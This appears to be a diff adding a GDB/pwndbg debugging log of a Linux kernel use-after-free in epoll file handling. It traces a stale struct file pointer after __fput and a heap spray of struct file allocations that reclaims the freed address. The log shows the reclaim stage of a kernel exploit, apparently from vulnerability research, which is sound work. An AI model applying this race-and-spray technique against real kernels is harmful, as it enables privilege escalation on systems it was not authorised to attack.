@@ -1,0 +1,73 @@
+[31m[1mpwndbg: [0m[31m[0m[91mloaded 199 pwndbg commands. Type [35mpwndbg [filter][0m[91m for a list.[0m
+[31m[1mpwndbg: [0m[31m[0m[91mcreated 12 GDB functions (can be used with print/break). Type [35mhelp function[0m[91m to see them.[0m
+0x0000000040000000 in ?? ()
+Breakpoint 1 at 0xffffffc0080a1de4: file kernel/fork.c, line 3159.
+\n[*] Signal: Thread 1 is about to close outer epoll. Enabling __ep_remove breakpoint.
+Breakpoint 2 at 0xffffffc0083bce2c: file fs/eventpoll.c, line 723.
+\n=======================================================
+=== STALE FILE POINTER CAPTURED IN THREAD 1 ===
+    file_ptr: 0xffffff800233de00
+    f_op:     0xffffffc009397b78
+    f_count:  1
+=======================================================\n
+Breakpoint 3 at 0xffffffc00835c5a0: file fs/file_table.c, line 296.
+\n[*] Signal: Thread 2 is about to close inner epoll.
+Breakpoint 4 at 0xffffffc00835c320: file fs/file_table.c, line 48.
+\n[*] BINGO! __fput CALLED for STALE file 0xffffff800233de00!
+[*] Verifying via register read inside breakpoint: $x0 = 0xffffff800233de00
+[*] f_op: 0xffffffc009397b78, f_count: 0
+[DEBUG] file_free_rcu called with x0=0xffffff800233de00
+[DEBUG] f_calc=0xffffff800233ddd0
+\n[*] Signal: Thread 3 is about to spray struct file objects.
+Breakpoint 5 at 0xffffffc00835c3d0: file fs/file_table.c, line 139.
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d400
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f200
+[DEBUG] kmem_cache_alloc returned 0xffffff800414fc00
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d300
+[DEBUG] kmem_cache_alloc returned 0xffffff800414fb00
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f100
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d500
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f800
+[DEBUG] kmem_cache_alloc returned 0xffffff800233dd00
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f000
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d200
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f900
+[DEBUG] kmem_cache_alloc returned 0xffffff800233da00
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f700
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d600
+[DEBUG] kmem_cache_alloc returned 0xffffff800414fa00
+[DEBUG] kmem_cache_alloc returned 0xffffff800233df00
+[DEBUG] kmem_cache_alloc returned 0xffffff800414ff00
+[DEBUG] kmem_cache_alloc returned 0xffffff800233dc00
+[DEBUG] kmem_cache_alloc returned 0xffffff800414fe00
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f400
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f600
+[DEBUG] kmem_cache_alloc returned 0xffffff800233db00
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f300
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d100
+[DEBUG] file_free_rcu called with x0=0xffffff800233d400
+[DEBUG] f_calc=0xffffff800233d3d0
+[DEBUG] file_free_rcu called with x0=0xffffff800233d300
+[DEBUG] f_calc=0xffffff800233d2d0
+[DEBUG] file_free_rcu called with x0=0xffffff800414f200
+[DEBUG] f_calc=0xffffff800414f1d0
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d300
+[DEBUG] file_free_rcu called with x0=0xffffff800414fc00
+[DEBUG] f_calc=0xffffff800414fbd0
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d400
+[DEBUG] file_free_rcu called with x0=0xffffff800414fb00
+[DEBUG] f_calc=0xffffff800414fad0
+[DEBUG] kmem_cache_alloc returned 0xffffff800414fb00
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d800
+[DEBUG] kmem_cache_alloc returned 0xffffff800414fc00
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d000
+[DEBUG] kmem_cache_alloc returned 0xffffff800414f200
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d900
+[DEBUG] kmem_cache_alloc returned 0xffffff800233d700
+[DEBUG] kmem_cache_alloc returned 0xffffff800233de00
+\n[!!!] BINGO: RECLAIM SUCCESSFUL! struct file allocated at 0xffffff800233de00 overlaps stale file_ptr!
+[*] Verifying via register read inside breakpoint: $x0 = 0xffffff800233de00
+
+Thread 1 hit Breakpoint 5, __alloc_file (flags=flags@entry=0x20000, cred=0xffffff807fa1e000) at fs/file_table.c:139
+139		if (unlikely(!f))
+[Inferior 1 (process 1) detached]
